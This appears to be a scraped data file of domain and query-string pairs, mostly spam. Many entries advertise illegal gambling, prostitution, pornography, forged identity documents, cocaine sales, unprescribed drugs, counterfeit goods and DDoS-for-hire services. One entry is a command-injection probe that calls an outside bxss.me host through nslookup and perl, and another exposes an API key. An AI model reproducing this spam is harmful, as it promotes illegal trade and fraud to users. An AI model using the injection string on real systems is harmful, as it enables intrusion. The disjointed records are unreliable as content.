('www.55hn.cc', '缅甸华纳国际赌场怎么注册开户  网址：www.55hn.cc   QQ：3443033649   飞机：@hnayjf2255')
('bz679.com', '塞内加尔驾驶证购买【网站【bz679.com】【英国离婚证办假的，哈萨克斯坦KYC资料哪里可以买，萨尔瓦多ID假的，比利时房产证办理《bz679.com》圣马力诺无犯罪记录证明仿造】波兰水电账单制造')
('wf75.com', '众恒彩票登入首页,官网:wf75.com')
('win456g.com', 'search-index-daftar poker qq【win456g.com】Nhà điều hành trò chơi lớn nhất châu Á】daftar poker qq【win456g.com】Nhà điều hành trò chơi lớn nhất châu Á】28fjyx忮')
('portal.tpu.ru', 'http://portal.tpu.ru:7777/SHARED/a/ASOLDATOF/Pol_ssilki/Tab')
('qh838.com', 'game bai tay -game bai tay dự đoán số đề hôm nay【 Copy_qh838.com_ mở Website  QH88 TẶNG KHUYẾN MÃI 100k  】 hoặc search google  【QH88 ,  QH88 - lô xiên qh88 hôm nay】.zbd')
('bv888.cc', '乐鱼足球官方登陆网址-【bv888.cc注册送88】买世界杯的平台.ktv')
('jusobot.com', 'x++19mall접속+“jusobot.com｝+19mall+19mall같은사이트+19mall+19mall')
('199f.top', '升博体育-升博体育(中国)官方网站【199f.top】欧宝电竞_首页yb亚博网站|全站首页银河游戏官方网东赢官网首页-东赢体育-东赢电竞泛亚电竞注册-泛亚电竞登录网址-泛亚电竞官网APP下载BG真人厅-+首页【199f.top】yobo体育全站手机版-yobo体育全站app下载昇得源体育-官网416098-search')
('ttk227.com', '成人AV免费【网址ttk227.com】自拍，巨乳女大生潮吹，正妹AV，成人影片【访问ttk227.com】免费成人高清在线AV视频】雅安qaWR')
('78114.cc', '华亿体育投注网官网下载【78114.cc】ab体育世界杯投注世界杯买球世界杯赔率世界杯赌球香港六合彩百家乐.gha-gifs')
('983857.icu', '溜溜体育直播无插件官方网唯一网站【官网：983857.icu】_rEBia')
('www.biorxiv.org', 'https://www.biorxiv.org/content/biorxiv/early/2022/03/27/2022.03.27.485979/DC2/embed/media-2.xlsx?download=true')
('aa82.icu', 'l오피뷰ギ 【aa82.icU】✦오피뷰안내♕오피뷰접속△오피뷰찾기❀오피뷰도메인 오피뷰주소')
('api.ipplus360.com', 'api.ipplus360.com/ip/geo/v1/district/?key=UGJ98znd3nTh0YD9kGNW8uQnHHNBJzd8J1K7tw9THErKyugK8zPlNhG3NPrMhedr')
('imtoken-vp.org', 'IM钱包怎么用 【imtoken-vp.org】 怎么下载IM钱包IM钱包怎么用 【imtoken-vp.org】 怎么下载IM钱包尕pidm35')
('xxxtr.com', '搜狗泛目录霸屏站群【联系纸飞机:jishu9900】搜狗泛目录霸屏站群服务信誉可靠诸多案例展.xxxtr.com')
('diva.org', 'oai\\:DiVA.org\\:kau-30014')
('bolivianamimi.fans', 'safadinha...._vamo_na_video_chamada_11975740713..._entra_no_meu_site_bolivianamimi.fans')
('12308.tw', '开云体育平台足球直播【网址:12308.tw】.xui')
('special.dahe.cn', 'http://special.dahe.cn/zhuanti/170105-1/index.shtml')
('oplove4.com', 'a++송탄립카페【OPLOVE4.COM】전라도마사지【OPLOVE4.COM】마석키방【OPLOVE4.COM】연수주점【OPLOVE4.COM】외대립카페【OPLOVE4.COM】중랑주점【oplove4.com】주안키방【OPLOVE4.COM】논산립카페')
('v.qq.com', '红人装广告语+v.qq.com加灰信gylm013')
('finance.sina.com.cn', 'https://finance.sina.com.cn/7x24/2022-11-12/doc-imqqsmrp5906402.shtml')
('ec-plus.panasonic.jp', 'https://ec-plus.panasonic.jp/store/ap/storeaez/a2A/ProductDetail?HB=EH-NA0J-A')
('www.ba', '수원오피【www.baＭ-bi76.com】밤비주소추천♨수원립카페ꊯ수원오피♤수원휴게텔ꊌ수원풀싸롱ꋠ수원오피↖수원안마ꋏ수원op')
('feng.ifeng.com', 'https://feng.ifeng.com/c/7nkBe1MDGZk')
('ag660.cc', '世界杯正规的买球平台ag660.cc】.scd')
('2bwww.trust4me.site', 'Pharmacy%2Blink%253A%2Bwww.Trust4Me.site%2BBuy%2BUro-tarivid.%2BUro-tarivid%2BNo%2BDescription%2BNeeded')
('www.789ddos.cn', 'ddos压力测试《流量攻击www.789ddos.cn》,网络暴力视频，攻击网站的软件app，攻击服务器的攻击方式ad')
('ctr-9999.com', '바카라+공식사이트【바로접속+ctr-9999.com】【신규가입+쿠폰+:+3만+지급】바카라+공식사이트【바로접속+ctr-9999.com】【신규가입+쿠폰+:+3만+지급】바카라+공식사이트哈密vX')
('ev050.com', 'f온라인식보【ev050.Com】카지노주소 잭팟 사이트')
('www.colahere.biz', 'Buying Cocaine www.ColaHere.biz Buying Cocaine coke Buy cocaine white')
('tronlh.com', '波场靓号☀️【官网:tronlh.com】☀️全网最牛巴中Caa7')
('ht98.tv', '2021欧洲杯买球【网址:HT98.TV】.kdo')
('wh588.com', 'nba投注软件哪里有？『网址:wh588.com』l5e8y8uc澳洲幸运10信誉实力平台微信群-swu22wsuw')
('www.datesol.xyz', '📲🍎+rencontre+activite+sportive+club+du+📲🍎www.datesol.xyz📲+rencontre+activite+sportive+club+du+📲+rencontre+activite+sportive+club+du+rencontre+activite+sportive+club+du+rencontre+activite+sportive+club+du+rencontre+activite+sportive+club+du')
('432da.com', 'Zhou Feng, executive of Bitmain【Copy URL∶432da.com】Honorable Mention Financial Experts Group Teach Making Money】SSE 50 ingredients【Copy URL∶432da.com】The most outstanding financial professors guide investment】tqltbqh6a')
('0hy.cc', '2022年足球世界杯中国『网址:0hy.cc』h7a7x7l2022世界杯哪里举办-棋牌圈子-金蟾捕鱼安装包-重庆时时彩怎么没官网-亚博足球进84yb丶cc-pe98y3')
('opop3.com', '대전opꊱ opop3.com《오피가이드주소》 대전키스방 대전op 대전opꊱ✸대전op 대전백마')
('ilovebam21.com', '사랑밤【ilovebam21.com】✛사랑가득한밤후기❆사랑밤사랑밤싸밤주소')
('t789.top', '레비트라사고싶어 t789.TOP 카마그라체험 레비트라처방전 프릴리지복용법 oiE')
('y617.com', '新优娱乐-官网首页-【官网y617.com】-新澳洲3分彩-网址首页-篮彩258-幸运七星彩网址-【官网y617.com】-内蒙快三开奖76')
('wf63.com', '极速飞艇组选倍投,官方:wf63.com')
('7668s.com', '巴基斯坦美女多少钱一晚上【一选妞网【7668s.com】嫖娼】美女买身电话号码多少9uk2pi')
('www.okexcomguanwang.com', '以太坊贸易套利大骗局【www.okexcomguanwang.com火币网交易平台】')
('41163.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《41163.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，化妆品进货网站排名。')
('zz-2936.liuhen.cc', 'q-11000-00---off-0hdict--00-1----0-10-0---0---0direct-10-ED--4--textpukuielbert,textmamaka-----0-1l--11-en-Zz-1---Zz-1-home-谷歌蜘蛛池收录【联系飞机：@lishengzhe】蜘蛛多，收录快！Zz-2936.liuhen.cc了解咨询！谷歌站群排名系统Zz-adid=4881948131--00-3-1-00-0--4----0-0-11-00-0utfZz-8-00')
('p77.tw', '英雄联盟菠菜竞猜网址【网址:p77.tw】.xwa')
('pv-lady.com', '[Betfair hash：pv-lady.com]四川泡泡纸批发|徒步四川怎么拍')
('hhu1.xyz', '免费成人影片搭讪少妇【在线视频：hhu1.xyz】日本a片，刀小刀抖音，女装中文，人妻斩五十路熟女热大陆，筱田步美中文肛交.efm')
('ht35.cc', 'beplay体育app官网下载【HT35.cc】         .mdn')
('dk.com', '白洁小说全文阅-20221013-c9nz3l G So Dk.com')
('youhui.pinduoduo.com', 'https://youhui.pinduoduo.com/goods/goods-detail?s=JbDbc4sjB')
('cc88yy.xyz', '中文字幕黄色片小【璜色网址cc88yy.xyz】姐未删版中文字幕')
('k188vip.com', 'xo bar spalding【k188vip.com】nạp tiền tặng 28%】Trận bóng đá gần đây【k188vip.com】nạp tiền tặng 28%】tawv93joz')
('ybag.cc', '开云体育下载app下载【网址:ybAG.CC】.toi')
('www.lemonaidhealth.shop', 'Brand Viagra Online Pharmacy - Viagra Online To ☌🤍🚎 Pharmacy link: 🦉 www.LemonaidHealth.shop 🦉 Viagra from $0.31 per pill 🚎🤍☌ Australia')
('dk854.com', 'saba mi 212【URL:dk854.com】')
('kicksyou.com', 'fake aj wholesale cheap shoes [kicksyou.com]')
('i99tv.in', 'tamilrockers+movies+2022+download【website:i99tv.in+】.lqu.0901')
('zm.news.so.com', 'http://zm.news.so.com/4300f618085d05feb8f763b2cce47c3d')
('protonmail.com', 'wickr+id+@ryhp+or+maxman90@protonmail.com+buying+cocaine+for+sale+darknet+drugs+in+Bristol+coke+market+wholesale')
('ae3888.com', 'ae3888.com【telegram∶@AK5537】google代全世界推广开户】44bet666.com【TG飞机∶@AK5537】谷歌优化竞价投放专业】bpxg591b0')
('hitwliccqehoo2caf6.bxss.me', '$(nslookup+hitwliccqehoo2caf6.bxss.me||perl+-e+"gethostbyname(\'hitwliccqehoo2caf6.bxss.me\')")+/*+or+klpry+*/aND+4325=1597+++2729')
('busan119.net', '부달주소【busan119.net】부달사이트±부산비비기⟕부달Ⅽ부산달리기བྷ부산달리기사이트')
('www.chinaz.com', 'www.chinaz.com/2019/1210/1071912.shtml')
('4771s.com', '为什么QQ上的只上门【→选妞【4771S.COM】←复制网址】成都哪里有150快餐的地方zqhbyk')
('7668tv.com', '万州医专妹快餐【→嫖娼【7668tv.com】←复制网址】惠州淡水立交桥小巷子快餐odby2a')
('ff33kk.xyz', '【手动输入ff33kk.xyz】美女60分钟没遮没挡随便看日曰扦插f194091w91w')
('img.gdpt.edu.cn', 'https://img.gdpt.edu.cn/down/14006')
('candyclub88.com', '糖果club官网【candyclub88.com】<- 糖果苹果 The first crypto social gaming club ---p56731')
('dty3.com', '❤️Mifepristone tablets in Sweden【website:dty3.com】【Cytotec abortion pill in Portugal，Misoprostol tablets in Bangladesh❤️website:dty3.com❤️MTP kit in Niger】Mifepristone and misoprostol tablets online Amazon')
('gag77.com', '彩票app【官网gag77.com】在线彩票，棋牌，百家乐，六合彩，北京赛车，大乐透，龙虎斗，世界杯【官网gag77.com】老牌信誉万人在线，任意存提，大额无忧】北安N1')
('www.77m.kr', 'macd지표{www.77m.kr}www.77m.kr 해외선물세금 옵션만기일주가☎해외선물정산가⒨유가선물시장 ゼ䔁 nondurables')
('x70.tv', '贝博app体育-贝博app体育👉复制网址[x70.tv]629永利娱乐JbzU7')
('www.digitalspy.com', 'http://www.digitalspy.com/author/13596/megan-davies/')
('ss928.xyz', '综合亚洲yy亚洲日..._综合亚洲yy亚洲日...-复制输入网址+++ss928.xyz++进入观看午夜爽片713')
('luzhousj.cnhhgjx.com', '���� luzhousj.cnhhgjx.com')
('www.onlinehuntingauctions.com', 'http://www.onlinehuntingauctions.com/auction.aspx?as=83423&p=3&mobile=0#i45982116')
('yesclub88.com', 'Malaysia casino 【yesclub88.com】Established reputation thousands of people online】Malaysia casino 【yesclub88.com】Established reputation thousands of people online】cv1vdxn8z')
('107kp.vip', '东方影视在线观看进入_107kp.vip_永久入口←输入打开')
('cookpad.com', 'https://cookpad.com/recipe/2589854')
('klq.gov.cn', 'http://klq.gov.cn/upload/files/2019/10/680c2a63166d6e56.xlsx')
('hpw.251520.com', '高仿UGG品牌『＋Q微 2754287712』《包包、皮带、手表、服装、饰品、鞋》 hpw.251520.com 哪里拿货 货源 批发 网站 价格 图片 hl')
('bc688.cc', '亚博体育官网-【网址bc688.cc】篮球应该去哪个平台买球.sgr')
('telegraman.com', '小飞机外国版下载安装最新版「下载官网telegraman.com」中文版纸飞机Telegram小飞机官方安卓app客户端在线下载，windows小飞机下载，电脑小飞机怎么下载「下载官网telegraman.com」中文版纸飞机Telegram小飞机官方安卓app客户端在线下载，苹果版小飞机怎么下载vx')
('www.goyo.pw', '[소사동소개팅] WWW.GOYO.PW  나운싱글 나운애인♋나운애인대행™나운야한거㊞ハ嘄unquestionably')
('sinbam8.com', 'v  인천휴게텔 신밤SINBAM8.COM 수원 휴게텔 대전 휴게텔')
('z400.net', '(Phốt+mới)+79Bet+lừa+đảo:+Có+2+triệu+cũng+vét+nốt,+cay+lắm!【Z400.NET】Sao+chép+link◆Trang+Web+Uy+Tín+Nhất+Châu+Á【Casino+chips')
('567bet.vip', '567bet.vip【tg电报∶@ak5537】代谷歌开户霸屏投放靠谱】秦皇岛谷歌推广【tg电报∶@ak5537】代googleseo优化推广包上】iraefmtg9')
('zab77.top', '씨알리스처방전없이 ⇢B홈: ZAB77.TOP  ☃카톡 PAA77 ☂☪')
('23811.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《23811.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，telegram里有哪些好的群。')
('avpom.com', '키타노 미나【avpom.com】음뇨龙泉TG')
('yycp9.vip', '快三6期稳定必中走势 【QQ∶38700038】【yycp9.vip】 快三怎样看技巧可以必中】快三6期稳定必中走势 【QQ∶38700038】【yycp9.vip】 快三怎样看技巧可以必中】5be845rko')
('qik.li', 'qik.li{8448} [NOTHASH].txt')
('primo.library.nenu.edu.cn', 'primo.library.nenu.edu.cn:1701')
('ybg8.cc', '亚博体育app官网送彩金【网址:ybG8.cc】.eor')
('boy13.xyz', '真人百家乐网 【官网boy13.xyz邀请码88088】.jco')
('am668.cc', 'google大连外围女网站【微11790911】【备用AM668.CC网址】.fus')
('yag8.cc', '乐鱼体育外围官网yAG8.CC】.iya')
('bet88.win', '越南google推广【TG飞机∶@bapingseo】谷歌优化霸屏霸屏靠谱】bet88.win【TG飞机∶@bapingseo】谷歌优化seo霸屏靠谱】')
('k8662.com', '優博積分網💚Sign up to get 5 usdt：K8662.com❤️優博積分網98lepbi優博積分網98lepbi')
('deribit.com', 'Deribit.com+отзывы|+Bityard.com+Bonus')
('y546.com', '视讯红黑-官网首页-【官网y546.com】-广东快乐10分-华球-NBA比赛押注平台-【官网y546.com】-欧宝会员登录if')
('spark.apache.org', 'user@spark.apache.org')
('fangbee.cn', 'fangbee.cn/news/7866')
('blog.pixnet.net', 'blog.pixnet.net/blog/profile/jerrylu817')
('ky8.lol', '英雄联盟赛事下注官网【官网:ky8.lol】.syc')
('www.pillnheals.store', '💈+Buy+Dapsone+Without+Prescription+👨\u200d⚕️+www.PillnHeals.store+👨\u200d⚕️+-+Low+Cost+Dapsone+💈Order+Dapsone+Capsules+Online+Buy+Dapsone+Cream+Order+Dapsone+25+Mg+Tablet+Buy+Dapsone+Gel+Canada')
('www.fgban.com', 'http://www.fgban.com/')
('sexxx.top', 'soi cau xo so tg hom nay【sexxx.top】du doan trung thuong mien bac hom nayxo so dak lak truc tiep hom nayvietlott quay so truc tieplô vềxsmnth5t 5【sexxx.top】xổ số đài tây ninh ngày 9 tháng 8đặc biệt hôm nay368102')
('news.sohu.com', 'http://news.sohu.com/20130922/n386980222.shtml')
('b654.vip', '博彩平台【打开官网B654.vip】澳门所有游戏的网址大全【卖排名b654.vip】代做排名包上首页')
('103kp.vip', '天美传媒麻豆娜娜_103kp.vip_易记地址←输入打开')
('yb560.cc', 'UserProfile:正规外围买球平台『网址:YB560.CC』-Y2B3T1Y足球买比赛平台网站-06eswwwww')
('opss010.com', '청주건마᛫청주휴게텔【OPSS010.COM】➵청주건마⎞벗고노는흑마청주건마㎧청주건마⎞키지마아이리&청주건마')
('sarangbam21.com', 'local-광주안마 【sarangbam21.com】 광주키스방 내쉬다 광주밤문화 광주립카페 아이러브밤주소 목포안마 광주유흥 아이러브밤주소')
('bet49.net', 'UserProfile:爱尔兰谷歌霸屏优化【TG飞机∶@XK5537】google广告投放，谷歌推广引流，谷歌关键词推广】bet49.net【TG電報∶@XK5537】谷歌優化開戶霸屏專業】wufo2b夯')
('mtv77.com', 'Mtv77.com_天籁音乐网')
('bet70.cc', 'bet70.cc【telegram∶@AK5537】代google霸屏seo霸屏包上】谷歌網站優化推廣【TG飞机∶@AK5537】FACEBOOK开户】08qv811ax')
('www.mm84.app', 'mm+live+app【Sexy+Live【www.mm84.app】Đăng+ký+tặng+60k+nạp+tiền+tặng+20%】tải+app+show+live【Kết+quả+tìm+kiếm【mm84.app】Đăng+ký+tặng+60k+nạp+tiền+tặng+20%】xvnw1vufd')
('justfall.lol', 'Justfall.Lol【Copy_S777web.com_Tặng Cược Miễn Phí 】 Search Google 【S777 Game Bài】 VIP')
('www.baike.com', 'http://www.baike.com/wiki/%E5%8F%B0%E5%8C%97%E6%8D%B7%E8%BF%90')
('15357.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《15357.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，在网上卖什么赚钱吗。')
('jajapamu.blogspot.com', 'jajapamu.blogspot.com/')
('84bet.net', '84bet.net【TG飞机∶@AK5537】谷歌，FACEBOOK开户】基本不等式的推廣證明【TG电报∶@AK5537】代谷歌霸屏竞价推广包上】5qj48u27s')
('yy82.icu', 'h압구정스파ハ 【yy82.icU】✱압구정건마✥압구정키스방 압구정노래방 압구정룸싸롱 압구정가라오케')
('tlpsr.wuxi.gov.cn', 'http://tlpsr.wuxi.gov.cn/uploadfiles/202211/14/202211141309305652510.xlsx')
('www.udpddos.cn', 'ddos网页端【www.udpddos.cn】,压力测试网站，流行的三种ddos攻击方式，ddos免费测压平台ook')
('95686.liuhen.cc', '谷歌搜索留痕收录【飞机：@lishengzhe】google搜索留痕程序，google引粉程序，谷歌蜘蛛池排名，google蜘蛛池收录，google快排程序《95686.liuhen.cc》谷歌外贸引流谷歌推广全球广告投放霸屏收录，加速精灵vpn卡。')
('lijiang.tjbxg888.com', 'lijiang.tjbxg888.com')
('ff55kk.xyz', '东洋【璜色网址ff55kk.xyz】精品影音先锋国产精品观看')
('ssggcc.xyz', '【手动输入ssggcc.xyz】免费APp你懂的你懂的图片无毒')
('www.shejihz.com', 'www.shejihz.com/archives/44281/')
('mt88.cc', '足球投注网站【登陆mt88.cc送88】【申请彩金加客服Q2583241】djFH.rfz')
